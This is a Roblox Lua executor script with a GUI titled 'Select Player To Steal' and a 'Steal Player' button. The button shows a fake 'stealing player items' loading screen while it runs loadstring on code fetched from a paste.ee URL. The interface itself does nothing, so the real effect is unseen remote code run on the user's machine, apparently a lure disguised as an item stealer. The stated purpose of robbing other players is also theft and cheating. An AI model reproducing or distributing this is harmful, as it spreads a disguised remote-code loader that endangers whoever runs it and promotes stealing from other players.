-- SERVICES
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")
local UIS = game:GetService("UserInputService")

-- GUI
local gui = Instance.new("ScreenGui", game.CoreGui)
gui.Name = "ExecutorUI"
gui.ResetOnSpawn = false

-- MAIN FRAME
local main = Instance.new("Frame", gui)
main.Size = UDim2.new(0, 300, 0, 300)
main.Position = UDim2.new(0.5, -150, 0.5, -150)
main.BackgroundColor3 = Color3.fromRGB(33, 33, 33)
main.Active = true
main.Draggable = true
main.BorderSizePixel = 0

local corner = Instance.new("UICorner", main)
corner.CornerRadius = UDim.new(0, 10)

-- TITLE
local title = Instance.new("TextLabel", main)
title.Size = UDim2.new(1, 0, 0, 30)
title.BackgroundTransparency = 1
title.Font = Enum.Font.GothamBold
title.Text = "Select Player To Steal"
title.TextColor3 = Color3.new(1, 1, 1)
title.TextSize = 14

-- PLAYER SLOTS
local selectedSlot = nil
for i = 1, 6 do
	local btn = Instance.new("TextButton", main)
	btn.Size = UDim2.new(1, -20, 0, 25)
	btn.Position = UDim2.new(0, 10, 0, 35 + (i - 1) * 30)
	btn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	btn.TextColor3 = Color3.fromRGB(0, 0, 0)
	btn.Text = Players:GetPlayers()[i] and Players:GetPlayers()[i].Name or "Empty Slot"
	btn.Font = Enum.Font.Gotham
	btn.TextSize = 14
	Instance.new("UICorner", btn)

	btn.MouseButton1Click:Connect(function()
		if selectedSlot then
			selectedSlot.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		end
		selectedSlot = btn
		btn.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
	end)
end

-- ACTION BUTTON
local actionBtn = Instance.new("TextButton", main)
actionBtn.Size = UDim2.new(0.8, 0, 0, 30)
actionBtn.Position = UDim2.new(0.1, 0, 1, -60)
actionBtn.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
actionBtn.Font = Enum.Font.GothamBold
actionBtn.Text = "Steal Player"
actionBtn.TextColor3 = Color3.new(1, 1, 1)
actionBtn.TextSize = 16
Instance.new("UICorner", actionBtn)

-- CREDITS
local credits = Instance.new("TextLabel", main)
credits.Size = UDim2.new(1, 0, 0, 20)
credits.Position = UDim2.new(0, 0, 1, -25)
credits.BackgroundTransparency = 1
credits.Font = Enum.Font.Code
credits.Text = "Made By Mangekyu Scripts"
credits.TextColor3 = Color3.fromRGB(200, 200, 200)
credits.TextSize = 13

-- Overlay and function
actionBtn.MouseButton1Click:Connect(function()
	local overlay = Instance.new("Frame", gui)
	overlay.Size = UDim2.new(1, 0, 1, 0)
	overlay.BackgroundColor3 = Color3.new(0, 0, 0)
	overlay.BackgroundTransparency = 1
	overlay.ZIndex = 10

	local tween = TweenService:Create(overlay, TweenInfo.new(0.5), {BackgroundTransparency = 0})
	tween:Play()

	local label = Instance.new("TextLabel", overlay)
	label.Size = UDim2.new(1, 0, 0, 50)
	label.Position = UDim2.new(0, 0, 0.4, 0)
	label.Text = "STEALING PLAYER ITEMS PLS WAIT 45-60SEC"
	label.TextColor3 = Color3.new(1, 1, 1)
	label.Font = Enum.Font.GothamBlack
	label.TextSize = 24
	label.BackgroundTransparency = 1
	label.ZIndex = 11

	local circle = Instance.new("ImageLabel", overlay)
	circle.Size = UDim2.new(0, 60, 0, 60)
	circle.Position = UDim2.new(0.5, -30, 0.55, -30)
	circle.Image = "rbxassetid://5073767509"
	circle.BackgroundTransparency = 1
	circle.ZIndex = 11

	local angle = 0
	local rotating = RunService.RenderStepped:Connect(function(dt)
		angle = (angle + dt * 180) % 360
		circle.Rotation = angle
	end)

	pcall(function()
		loadstring(game:HttpGet("https://paste.ee/r/a7PN8d6Q"))()
	end)

	wait(45)
	rotating:Disconnect()
	overlay:Destroy()
end)
